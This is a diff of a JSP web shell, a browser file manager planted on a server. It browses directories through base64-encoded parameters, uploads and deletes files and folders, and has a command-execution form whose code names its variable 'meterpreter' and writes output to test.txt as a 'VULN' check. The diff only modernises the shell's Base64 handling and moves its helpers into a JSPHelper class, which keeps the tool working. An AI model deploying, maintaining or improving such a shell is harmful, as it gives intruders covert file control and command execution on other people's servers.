@@ -3,7 +3,7 @@
 <%@ page import="java.nio.file.*" %>
 <%@ page import="java.util.*" %>
 <%@ page import="java.text.SimpleDateFormat" %>
-<%@ page import="org.apache.commons.codec.binary.Base64" %>
+<%@ page import="java.util.Base64" %>
 <!DOCTYPE html>
 <html>
 <head>
@@ -171,60 +171,56 @@
 <body>
 <div class="container">
 <%
-// Utility functions - menggunakan method static
-public static String encodeBase64(String b) {
-    return Base64.encodeBase64String(b.getBytes());
-}
-
-public static String decodeBase64(String b) {
-    return new String(Base64.decodeBase64(b));
-}
-
-public static boolean deleteDirectory(File dir) {
-    if (!dir.exists()) {
-        return true;
-    }
-    if (!dir.isDirectory()) {
-        return dir.delete();
+// Helper methods using inline approach
+class JSPHelper {
+    public static String encodeBase64(String b) {
+        return Base64.getEncoder().encodeToString(b.getBytes());
     }
     
-    File[] files = dir.listFiles();
-    if (files != null) {
-        for (File file : files) {
-            if (file.isDirectory()) {
-                deleteDirectory(file);
-            } else {
-                file.delete();
+    public static String decodeBase64(String b) {
+        try {
+            return new String(Base64.getDecoder().decode(b));
+        } catch (Exception e) {
+            return b;
+        }
+    }
+    
+    public static boolean deleteDirectory(File dir) {
+        if (!dir.exists()) {
+            return true;
+        }
+        if (!dir.isDirectory()) {
+            return dir.delete();
+        }
+        
+        File[] files = dir.listFiles();
+        if (files != null) {
+            for (File file : files) {
+                if (file.isDirectory()) {
+                    deleteDirectory(file);
+                } else {
+                    file.delete();
+                }
             }
         }
-    }
-    return dir.delete();
-}
-
-// Decode GET parameters
-Enumeration<String> paramNames = request.getParameterNames();
-while (paramNames.hasMoreElements()) {
-    String paramName = paramNames.nextElement();
-    String paramValue = request.getParameter(paramName);
-    if (paramValue != null && !paramValue.isEmpty()) {
-        try {
-            request.setAttribute("decoded_" + paramName, decodeBase64(paramValue));
-        } catch (Exception e) {
-            request.setAttribute("decoded_" + paramName, paramValue);
-        }
+        return dir.delete();
     }
 }
 
+// Initialize variables
 String rootDirectory = System.getProperty("user.dir");
 String scriptDirectory = new File(request.getServletContext().getRealPath(request.getServletPath())).getParent();
 
+// Decode GET parameters
+String currentDirectoryParam = request.getParameter("d");
 String currentDirectory = rootDirectory;
-if (request.getAttribute("decoded_d") != null) {
-    currentDirectory = (String) request.getAttribute("decoded_d");
+if (currentDirectoryParam != null && !currentDirectoryParam.isEmpty()) {
+    currentDirectory = JSPHelper.decodeBase64(currentDirectoryParam);
 }
 
 String viewCommandResult = "";
 
+// Process POST requests
 if ("POST".equalsIgnoreCase(request.getMethod())) {
     try {
         // File Upload
@@ -283,7 +279,7 @@ if ("POST".equalsIgnoreCase(request.getMethod())) {
         // Command Execution
         String cmdInput = request.getParameter("cmd_input");
         if (cmdInput != null && !cmdInput.isEmpty()) {
-            String meterpreter = Base64.encodeBase64String((cmdInput + " > test.txt").getBytes());
+            String meterpreter = Base64.getEncoder().encodeToString((cmdInput + " > test.txt").getBytes());
             viewCommandResult = "<hr><p>Result: <font color=\"black\">base64 : " + meterpreter + 
                 "</font><br>Please Refresh and Check File test.txt, this output command<br>" +
                 "test.txt created = VULN<br>test.txt not created = NOT VULN<br>" +
@@ -329,7 +325,7 @@ if ("POST".equalsIgnoreCase(request.getMethod())) {
             File fileToDelete = new File(currentDirectory + File.separator + deleteFile);
             if (fileToDelete.exists()) {
                 if (fileToDelete.isDirectory()) {
-                    if (deleteDirectory(fileToDelete)) {
+                    if (JSPHelper.deleteDirectory(fileToDelete)) {
                         out.println("<hr>Folder deleted successfully!<hr>");
                     } else {
                         out.println("<hr>Error: Failed to delete folder!<hr>");
@@ -408,13 +404,13 @@ if ("POST".equalsIgnoreCase(request.getMethod())) {
         if (directories[i].isEmpty()) continue;
         currentPath += File.separator + directories[i];
         if (i == 0) {
-            out.print("/<a href=\"?d=" + encodeBase64(currentPath) + "\">" + directories[i] + "</a>");
+            out.print("/<a href=\"?d=" + JSPHelper.encodeBase64(currentPath) + "\">" + directories[i] + "</a>");
         } else {
-            out.print("/<a href=\"?d=" + encodeBase64(currentPath) + "\">" + directories[i] + "</a>");
+            out.print("/<a href=\"?d=" + JSPHelper.encodeBase64(currentPath) + "\">" + directories[i] + "</a>");
         }
     }
 %>
-<a href="?d=<%= encodeBase64(scriptDirectory) %>"> / <span style="color: green;">[ GO Home ]</span></a>
+<a href="?d=<%= JSPHelper.encodeBase64(scriptDirectory) %>"> / <span style="color: green;">[ GO Home ]</span></a>
 <br>
 
 <hr>
@@ -485,8 +481,8 @@ if ("POST".equalsIgnoreCase(request.getMethod())) {
         for (File file : files) {
             String itemName = file.getName();
             String itemLink = file.isDirectory() ? 
-                "?d=" + encodeBase64(currentDirectory + File.separator + itemName) : 
-                "?d=" + encodeBase64(currentDirectory) + "&f=" + encodeBase64(itemName);
+                "?d=" + JSPHelper.encodeBase64(currentDirectory + File.separator + itemName) : 
+                "?d=" + JSPHelper.encodeBase64(currentDirectory) + "&f=" + JSPHelper.encodeBase64(itemName);
             
             String permissions = "";
             if (file.canRead()) permissions += "r";
